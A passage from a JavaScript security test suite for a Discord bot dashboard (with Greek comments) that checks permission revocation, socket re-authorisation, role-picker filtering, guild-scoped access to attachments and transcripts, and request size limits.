    // Η σήμανση εμφανίζεται μόνο με OAuth ενεργό, που δεν ισχύει εδώ — οπότε
    // ελέγχεται ότι το template την ξέρει, όχι η απόδοση αυτού του fixture.
    const view = fs.readFileSync(path.join(ROOT, 'src/dashboard/views/permissions.ejs'), 'utf8');
    /person\.canSignIn === false/.test(view) && view.includes('perm-badge-blocked')
      ? pass('and marks the people who cannot sign in at all')
      : fail('no mark for an account that is locked out of the login');
  }

  section('Turning the overview off actually takes it away');
  {
    const manager = forgeSession('u42');

    const before = await fetch(`${BASE}/api/stats?guildId=g1`, { headers: { cookie: manager } });
    before.status === 200
      ? pass('Manage Server starts with the overview')
      : fail(`baseline stats -> ${before.status}`);

    database.setDashboardPermission('g1', 'u42', 'view', false);

    const stats = await fetch(`${BASE}/api/stats?guildId=g1`, { headers: { cookie: manager } });
    stats.status === 403
      ? pass('and loses it the moment you say no — the session does not keep it alive')
      : fail(`stats after revoke -> ${stats.status}`);

    const page = await fetch(`${BASE}/invites?guildId=g1`, { headers: { cookie: manager }, redirect: 'manual' });
    page.status === 403
      ? pass('the pages go with it')
      : fail(`invites after revoke -> ${page.status}`);

    const perms = await fetch(`${BASE}/permissions?guildId=g1`, { headers: { cookie: manager }, redirect: 'manual' });
    perms.status === 403
      ? pass('and so does the page that could undo it')
      : fail(`permissions after revoke -> ${perms.status}`);

    database.setDashboardPermission('g1', 'u42', 'view', null);
    const after = await fetch(`${BASE}/api/stats?guildId=g1`, { headers: { cookie: manager } });
    after.status === 200
      ? pass('putting it back on restores access')
      : fail(`stats after restore -> ${after.status}`);
  }

  section('The live feed asks again instead of trusting a snapshot');
  {
    const source = fs.readFileSync(path.join(ROOT, 'src/dashboard/server.js'), 'utf8');

    // Τα δικαιώματα του socket ήταν παγωμένα από τη στιγμή της σύνδεσης, οπότε
    // μια ανάκληση δεν έφτανε ποτέ σε ανοιχτή σελίδα.
    /async function refreshSocketViewer/.test(source)
      ? pass('a socket rebuilds who it belongs to')
      : fail('the socket viewer is still a snapshot from connection time');

    /expiresAt && Date\.now\(\) > expiresAt/.test(source)
      ? pass('and drops when the session behind it has expired')
      : fail('an expired session keeps its socket forever');

    const broadcasts = (source.match(/client\.on\('dashboard:(sync|commandLogs|clearLogs)'/g) || []).length;
    // Μόνο οι κλήσεις, όχι και ο ορισμός της ίδιας της συνάρτησης.
    const refreshed = (source.match(/eachViewer\(\(socket, viewer\)/g) || []).length;
    broadcasts === 3 && refreshed === 3
      ? pass('every broadcast re-derives before it sends')
      : fail(`${refreshed} of ${broadcasts} broadcasts re-derive`);

    /if \(!mayView\(viewer\)\) return;\s*\n\s*socket\.emit\('dashboard:sync'/.test(source)
      ? pass('and nothing is pushed to someone without the overview')
      : fail('the sync payload still goes out without checking the overview');

    !/guildOptions: getGuildOptions\(client\),/.test(source)
      ? pass('the guild list sent over the socket is the viewer own, not every server')
      : fail('every socket is told every server the bot is in');
  }

  section('The role picker offers only roles worth giving');
  {
    const admin = forgeSession('uadmin');
    const page = await fetch(`${BASE}/permissions?guildId=g1`, { headers: { cookie: admin } });
    const html = await page.text();

    html.includes('Moderator')
      ? pass('an ordinary role is offered')
      : fail('the Moderator role is missing');

    !html.includes('BotRole')
      ? pass('a role managed by an integration is not — nobody can be given it')
      : fail('a managed role is offered');

    !html.includes('@everyone')
      ? pass('and neither is @everyone, which would unlock rather than restrict')
      : fail('@everyone is offered as a restriction');

    html.includes('cmd-access-row') && html.includes('/clear')
      ? pass('the restrictable commands are listed')
      : fail('no command access rows rendered');

    !html.includes('data-command="play"')
      ? pass('and the music is not among them')
      : fail('a music command is offered for locking');
  }

  section('Deleted-message files follow the same rule as the transcripts');
  {
    const manager = forgeSession('u42');
    const admin = forgeSession('uadmin');

    const asManager = await fetch(`${BASE}/attachments/g1/u1/x.svg`, { headers: { cookie: manager }, redirect: 'manual' });
    asManager.status === 403
      ? pass('Manage Server cannot download files from deleted messages')
      : fail(`manager attachment -> ${asManager.status}`);

    const asAdmin = await fetch(`${BASE}/attachments/g1/u1/x.svg`, { headers: { cookie: admin }, redirect: 'manual' });
    asAdmin.status === 200
      ? pass('Administrator can')
      : fail(`admin attachment -> ${asAdmin.status}`);

    const otherGuild = await fetch(`${BASE}/attachments/g-elsewhere/u1/x.svg`, { headers: { cookie: admin }, redirect: 'manual' });
    otherGuild.status === 403
      ? pass('being admin here does not open another server files')
      : fail(`cross-guild attachment -> ${otherGuild.status}`);
  }

  section('A transcript can only be deleted by its own server');
  {
    const admin = forgeSession('uadmin');

    database.logClear(
      { id: 'm1', tag: 'mod#1' },
      { id: 'c1', name: 'general' },
      { id: 'g-elsewhere', name: 'Somewhere Else' },
      [{ id: '1', content: 'secret', authorId: 'a', createdAt: new Date().toISOString() }]
    );
    const foreign = database.getClearLogs().find((row) => row.guild_id === 'g-elsewhere');

    if (!foreign) {
      fail('could not create a transcript in another guild for the test');
    } else {
      const res = await fetch(`${BASE}/api/clear-logs/${foreign.id}`, {
        method: 'DELETE', headers: { cookie: admin }, redirect: 'manual'
      });
      res.status === 403
        ? pass('deleting another server transcript is refused')
        : fail(`cross-guild delete -> ${res.status}`);

      database.getClearLog(foreign.id)
        ? pass('and the transcript is still there')
        : fail('the transcript was deleted anyway');
    }
  }

  const big = await fetch(`${BASE}/api/player/control`, {
    method: 'POST', headers: { 'content-type': 'application/json', cookie },
    body: JSON.stringify({ action: 'x', pad: 'A'.repeat(64 * 1024) }), redirect: 'manual'
  });
  big.status === 413 ? pass('oversized body -> 413') : fail(`64KB body -> ${big.status}`);

  await new Promise((r) => { server.close(r); setTimeout(r, 1500).unref(); });
  try { database.close(); } catch {}
}

(async () => {
  try {
    testTranscriptRenderer();
    await testHttp();
  } catch (err) {
    fail(`harness error: ${err.message}`);
    console.error(err);
  }
  try { fs.rmSync(tmp, { recursive: true, force: true }); } catch {}
  finish('all security checks passed');
})();
